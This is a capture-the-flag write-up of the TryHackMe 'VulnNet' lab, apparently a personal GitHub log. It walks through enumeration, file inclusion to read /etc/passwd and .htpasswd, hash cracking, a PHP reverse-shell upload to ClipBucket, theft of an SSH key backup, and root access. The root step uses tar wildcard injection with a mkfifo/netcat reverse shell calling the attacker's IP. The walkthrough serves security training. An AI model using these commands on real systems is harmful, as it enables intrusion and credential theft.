<h1 align="center">VulnNet</h1>
<p align="center">2025, October 6<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>518</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Can you take advantage of the misconfigurations made by VulnNet Entertainment?</em>?<br>
<img width="80px" src="https://github.com/user-attachments/assets/8046123d-0c59-441e-87ac-d7e905a7ca54"><br>
Access it <a href="https://tryhackme.com/room/vulnnet1">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/adf3cd32-1b5e-49a4-9614-628073b0bdc6"></p>

<h2>Task 1 .VulnNet</h2>
<p>The purpose of this challenge is to make use of more realistic techniques and include them into a single machine to practice your skills.<br>

- Difficulty: Medium<br>
- Web Language: PHP<br>

=> ﻿You will have to add a machine IP with domain <code>vulnnet.thm</code> to your /etc/hosts</p>

<h6>Icon made by monkik from www.flaticon.com</h6>

<p><em>Answer the questions below</em></p>

<br>
<h1 align="center">Summary</h1>
<p>

- [Static Host Mapping](#1)<br>  
- [Port Scanning](#2)<br>
- [Web Vulberability Scanning](#3)<br>
- [Directory and File Enumeration](#4)<br>
- [Web Interface Inspection, Weaponization, Delivery & Execution](#5)<br>
- [Initial Foothold](#6)<br>
- [Privilege Escalation & User Flag](#7)<br>
- [Privilege Escalation & Root Flag](#8)</p>

<br>
<br>
<br>
<br>
<br>
<h1 align="center">Static Host Mapping<a id='1'></h1>

```bash
echo 'xx.xxx.xx.xxx vulnnet.thm' >> /etc/hosts
```

<h1  align="center">Port Scanning<a id='2'></h1>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     |
|-------------------:|:---------------------|:--------------------------------|
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
| `80`               |`HTTP`                |Apache httpd 2.4.29              |

</p></div><br>

```bash
:~/VulnNet# nmap -sV -sC -Pn  -p- -T4 vulnnet.thm
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
```

<br>
<h1 align="center">Web Vulnerability Scanning<a id='3'></h1>
<p align="center">DEBUG HTTP verb may show server debugging information<br>/img/ might be interesting<br>License file<br>Apache default file<br>Admin login page</p>
</p>

```bash
:~/VulnNet# nikto -h http://xx.xxx.xx.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    vulnnet.thm
+ Target Port:        80
+ Start Time:         2025-10-06 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ Server leaks inodes via ETags, header found with file /LICENSE.txt, fields: 0x455 0x5b995f090f3a1 
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.html: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2025-10-06 xx:xx:xx (GMT1) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<h1 align="center">Directory and File Enumeration<a id='4'></h1>

```bash
:~/VulnNet# dirsearch -u http://vulnnet.thm/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt
...
[xx:xx:xx] Starting: 
[xx:xx:xx] 301 -  300B  - /css  ->  http://vulnnet/css/
[xx:xx:xx] 301 -  302B  - /fonts  ->  http://vulnnet/fonts/
[xx:xx:xx] 301 -  300B  - /img  ->  http://vulnnet/img/
[xx:xx:xx] 301 -  299B  - /js  ->  http://vulnnet/js/

Task Completed
```

<br>
<h1 align="center">Web Interface Inspection, Weaponization, Delivery & Execution<a id='5'></h1>
<p>
  
- Identified <strong>js/index__7ed54732.js</strong> and <strong>/js/index__d8338055.js</strong>.<br>Using <a href=" https://beautifier.io/">Beautifier</a> discovered <strong>broadcast.vulnnet.thm</strong> and <strong>http://vulnnet.thm/index.php?referer=</strong> respectively.<br><br>
- Navigated to <strong>vulnnet.thm/login.html</strong>.<br><br>
- Launched <code>Burp Suite</code> and enabled <code>FoxyProxy</code>.<br><br>
- Tested for SQLi using <strong>' OR '1'='1</strong>:<strong>password</strong>. SQLi is not present.<br><br>
- Added <strong>broadcast.vulnnet.thm</strong> to <strong>/etc/hosts</strong>.<br><br>
- Navigated to <strong>broadcast.vulnnet.thm</strong>. Credentials are needed.</br><br>
- Navigated to <strong>vulnnet.thm/index.php?referer=/etc/passwd</strong> considering the discovery in <strong>/js/index__d8338055.js</strong>.<br><br>
- Identified users <strong>root</strong> and <strong>system-management</strong>.<br><br>
- Navigated to <strong>vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd</strong>.<br><br>
- Discovered a hash in Burp´s response: <strong>developers:$apr1$********$**********************</strong><br><br>
- Saved it to <strong>Hash</strong> file.<br><br>
- Cracked the hash using <code>John the Ripper</code> discovering: developers:-----------sls<br><br>
- Logged in on <strong>broadcast.vulnnet.thm</strong> with the credentials just uncovered.<br>It is running <strong><ins>ClipBucket v4.0<ins></strong> which is vulnerable to <strong><ins>Unauthenticated File Upload</ins></strong>. Exploit in <a href="https://www.exploit-db.com/exploits/44250">ExploitDB</a> or also <strong>44250.txt</strong> through <code>searchsploit</code>.<br><br>
- Downloaded <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PentestMonkey PHP Reverse Shell</a>. Edited ip and port. Renamed it to <strong><ins>rev.php</ins></code>.<br><br>
- Uploaded a php file in <strong>broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR</strong>.<br><br>
- Setup a listener.<br><br>
- Got the shell as <strong>www-data</strong> after accessing the php file just uploaded and waiting around 1 minute. Stabilized the shell.</p>

<br>

<img width="880" height="548" alt="image" src="https://github.com/user-attachments/assets/84658acf-726b-4d48-96e2-a23b8eeb066a" />

<br>
<br>
<br>

<img width="874" height="425" alt="image" src="https://github.com/user-attachments/assets/99aa8205-c83f-49d6-b508-67c1fa78cdd5" />

<br>
<br>
<br>

<img width="869" height="360" alt="image" src="https://github.com/user-attachments/assets/e9c8a7fe-0c1a-4a21-8443-832d9a537bf9" />

<br>
<br>
<br>

<img width="1156" height="306" alt="image" src="https://github.com/user-attachments/assets/93998760-d8cc-41ce-b859-9d0dfa44c23d" />

<br>
<br>
<br>

<img width="1135" height="792" alt="image" src="https://github.com/user-attachments/assets/ed2e40ff-9dfe-41bd-86f9-6dd0fb4a96a6" />

<br>
<br>
<br>

<img width="876" height="473" alt="image" src="https://github.com/user-attachments/assets/344f7deb-82c4-4527-8cc6-adbde315dba8" />

<br>
<br>
<br>

<img width="876" height="526" alt="image" src="https://github.com/user-attachments/assets/a726beef-07f3-4537-9bc2-5ffe00abf0c1" />

<br>
<br>
<br>

<p><em>Request</em></p>

```bash
GET /login.html?login=%27+OR+%271%27%3D%271&password=password123%40 HTTP/1.1
Host: vulnnet.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://vulnnet.thm/login.html
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

<p><em>Response</em></p>

```bash
HTTP/1.1 200 OK
...
ETag: "9af-*************-gzip"
...
Content-Type: text/html

<!DOCTYPE html>
...
```

<br>

```bash
echo 'xx.xxx.xx.xxx broadcast.vulnnet.thm' >> /etc/hosts
```

<br>

<img width="875" height="325" alt="image" src="https://github.com/user-attachments/assets/aa588b03-4584-4513-8d97-0760f9b10a87" />

<br>
<br>
<br>

<img width="1108" height="537" alt="image" src="https://github.com/user-attachments/assets/65f419ee-e61b-4bdd-9ec0-8316448c08c4" />

<br>
<br>
<br>

<img width="1234" height="189" alt="image" src="https://github.com/user-attachments/assets/6c64e21f-cbbf-45e4-801d-c613ca1699e8" />

<br>
<br>
<br>

```bash
:~/VulnNet# john Hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1134" height="300" alt="image" src="https://github.com/user-attachments/assets/ff8995b1-7630-4ab0-92cb-adcd4f9cfd80" />

<br>
<br>
<br>

<img width="889" height="448" alt="image" src="https://github.com/user-attachments/assets/80e587c4-91fe-495d-a04e-53620f5c800e" />

<br>
<br>
<br>

<img width="1122" height="683" alt="image" src="https://github.com/user-attachments/assets/9b723f96-bb73-4697-9e0d-06f366f18c13" />

<br>
<br>
<br>

<img width="1139" height="203" alt="image" src="https://github.com/user-attachments/assets/21fa1b46-19a9-4a1c-8adc-0e482aea1b88" />

<br>
<br>
<br>

<img width="1139" height="605" alt="image" src="https://github.com/user-attachments/assets/06b20834-2bfb-4e85-876f-101675270c3e" />

<br>
<br>
<br>

```bash
:~/VulnNet# curl -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" http://developers:-----------sls@broadcast.vulnnet.thm/actions/beats_uploader.php -X POST
creating file{"success":"yes","file_name":"1759778588419aa2","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"} 
```

<img width="1122" height="287" alt="image" src="https://github.com/user-attachments/assets/320c0d47-ebf4-4fc2-888e-2e7887926b4f" />

<br>
<br>
<br>
<br>
<h1 align="center">Initial Foothold<a id='6'></h1>
<p>

- Set up an HTTP server in the attacker machine. Downloaded <code>linpeas.sh</code>, changed its permissions, and executed it. It highlighted <strong><ins>/var/backups/ssh-backup.tar.gz</ins></strong> owned by <strong>system-management</strong>.<br><br>
- Set up an HTTP server in the target machine. Downloaded <strong><ins>ssh-backup.tar.gz</ins></strong>.<br><br>
- Uncompressed it using <code>tar</code>, and obtained <strong><ins>id_rsa</ins></strong>.<br><br>
- Attempedd SSH login and identified that a passphrase was required.<br><br>
- Made a backup of <strong><ins>id_rsa</ins></strong>.<br><br>
- Converted the encrypted private key into a John the Ripper format using <code>ssh2john</code>. Used John to crack the passphrase.<br><br>
- Logged in as <strong>system-management</strong> via <code>SSH</code>. Initial foothold achieved.</p>

<br>

```bash
[+] Backup files?
...
-rw-rw-r-- 1 server-management server-management 1484 Jan 24  2021 /var/backups/ssh-backup.tar.gz
...
```

<br>

```bash
www-data@vulnnet:/var/backups$ ls -lah
total 2.3M
drwxr-xr-x  2 root              root              4.0K Oct  6 20:12 .
drwxr-xr-x 14 root              root              4.0K Jan 23  2021 ..
-rw-r--r--  1 root              root               50K Jan 23  2021 alternatives.tar.0
-rw-r--r--  1 root              root               14K Jan 23  2021 apt.extended_states.0
-rw-r--r--  1 root              root                11 Jan 23  2021 dpkg.arch.0
-rw-r--r--  1 root              root                43 Jan 23  2021 dpkg.arch.1.gz
-rw-r--r--  1 root              root                43 Jan 23  2021 dpkg.arch.2.gz
-rw-r--r--  1 root              root               280 Jan 23  2021 dpkg.diversions.0
-rw-r--r--  1 root              root               160 Jan 23  2021 dpkg.diversions.1.gz
-rw-r--r--  1 root              root               160 Jan 23  2021 dpkg.diversions.2.gz
-rw-r--r--  1 root              root               265 Jan 23  2021 dpkg.statoverride.0
-rw-r--r--  1 root              root               195 Jan 23  2021 dpkg.statoverride.1.gz
-rw-r--r--  1 root              root               179 Jan 23  2021 dpkg.statoverride.2.gz
-rw-r--r--  1 root              root              1.4M Jan 25  2021 dpkg.status.0
-rw-r--r--  1 root              root              378K Jan 23  2021 dpkg.status.1.gz
-rw-r--r--  1 root              root              358K Jan 23  2021 dpkg.status.2.gz
-rw-------  1 root              root               857 Jan 23  2021 group.bak
-rw-------  1 root              shadow             712 Jan 23  2021 gshadow.bak
-rw-------  1 root              root              1.8K Jan 23  2021 passwd.bak
-rw-------  1 root              shadow            1.1K Jan 23  2021 shadow.bak
-rw-rw-r--  1 server-management server-management 1.5K Jan 24  2021 ssh-backup.tar.gz
-rw-r--r--  1 root              root               49K Oct  6 21:38 vulnnet-Monday.tgz
```

```bash
:~/VulnNet# wget http://xx.xxx.xx.xxx:8000/ssh-backup.tar.gz
```

```bash
www-data@vulnnet:/var/backups$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xxx.xxx - - [06/Oct/2025 xx:xx:xx] "GET /ssh-backup.tar.gz HTTP/1.1" 200 -
```

```bash
:~/VulnNet# tar xvf ssh-backup.tar.gz
id_rsa
```

```bash
:~/VulnNet# chmod 600 id_rsa
chmod 600 id_rsa
```

```bash
:~/VulnNet# ssh -i id_rsa server-management@vulnnet.thm
Enter passphrase for key 'id_rsa': 
```

```bash
:~/VulnNet# cat hey
Hash:$sshng$1$16$...A97A7DAB4829FE59CC561FB2CCC4$1200$9911434...
```

```bash
:~/VulnNet# python3 /opt/john/ssh2john.py Hash
Hash:$sshng$1$16$...A97A7DAB4829FE59CC561FB2CCC4$1200$9911434...
```

```bash
:~/VulnNet# john hey --wordlist=/usr/share/wordlists/rockyou.txt
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
---------yac     (Hash)
1g 0:00:00:11 DONE (2025-10-06 xx:xx) 0.08880g/s 1273Kp/s 1273Kc/s 1273KC/s *7¡Vamos!
Session completed.
```

<br>
<h1 align="center">Privilege Escalation & User Flag<a id='7'></h1>

```bash
:~/VulnNet# ssh -i id_rsa server-management@vulnnet.thm
...
server-management@vulnnet:~$ id
uid=1000(server-management) gid=1000(server-management) groups=1000(server-management)
```

```bash
server-management@vulnnet:~$ pwd
/home/server-management
```

```bash
server-management@vulnnet:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
```

```bash
server-management@vulnnet:~$ cat user.txt
THM{********************************}
```

<br>
<p>1.1. What is the user flag? (user.txt)<br>
<code>THM{********************************}</code></p>
<br>
<br>

```bash
[+] Backup files?
...
-rwxr--r-- 1 root root 530 Jan 23  2021 /var/opt/backupsrv.sh
...
```

<img width="1230" height="304" alt="image" src="https://github.com/user-attachments/assets/ed753ea0-655b-4f89-8e7f-600ffe877dc5" />

<br>
<br>
<br>

<img width="1232" height="411" alt="image" src="https://github.com/user-attachments/assets/1def7cdb-49f6-4c48-a873-3bbb112b2e6c" />

<br>
<br>
<br>

<img width="1230" height="451" alt="image" src="https://github.com/user-attachments/assets/4a3b3111-7ea3-4926-91c5-01f2d2df8c04" />

<br>
<br>
<br>

<img width="1230" height="330" alt="image" src="https://github.com/user-attachments/assets/fb92e5dd-d6e0-4b15-9f39-e112f74cbbf4" />

<br>
<br>
<br>

```bash
server-management@vulnnet:/var/opt$ ls -lah
total 12K
drwxr-xr-x  2 root root 4.0K Jan 23  2021 .
drwxr-xr-x 14 root root 4.0K Jan 23  2021 ..
-rwxr--r--  1 root root  530 Jan 23  2021 backupsrv.sh
```

```bash
server-management@vulnnet:/var/opt$ cat backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

<br>

```bash
:~/VulnNet# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

<br>

```bash
server-management@vulnnet:~/Documents$ nano shell.sh
server-management@vulnnet:~/Documents$ cat shell.sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xxx.xxx.xxx 4444 >/tmp/f
server-management@vulnnet:~/Documents$ echo > '--checkpoint=1'
server-management@vulnnet:~/Documents$ echo > '--checkpoint-action=exec=sh shell.sh'
```

<img width="1227" height="157" alt="image" src="https://github.com/user-attachments/assets/8ef47cde-8483-44ce-9155-7eaeb2bde190" />

<br>
<br>
<br>
<br>
<h1 align="center">Privilege Escalation & Root Flag<a id='8'></h1>

```bash
root@...:~/VulnNet# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xxx 41920
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/server-management/Documents
# cd /root
# ls
root.txt
# cat root.txt
THM{********************************}
```

<img width="1170" height="275" alt="image" src="https://github.com/user-attachments/assets/38d58417-ca08-4e1e-baeb-ca9b15205994" />

<br>
<br>
<br>
<p>1.2. What is the root flag? (root.txt)<br>
<code>THM{********************************}</code></p>
<br>
<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/ac4e7796-26f6-462b-aa51-93968a1fd869"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/eb01a3a5-dd74-49bd-9c33-7e4ad6f14ea5"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129.021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>

<p align="center">Global All Time:   105ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/22666e1b-3012-41c4-90f7-705342d59d57"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/967ca059-edb0-469f-a9d4-12f74331ba8d"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/81aeb01a-2280-4fe7-910d-a3a09b122b68"><br>
                  Global monthly:     348ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7fc9d415-cf42-4e37-84b4-6643fde362df"><br>
                  Brazil monthly:       5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/da3e7285-f4cc-40d9-a26e-8828f614da88"><br>


<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
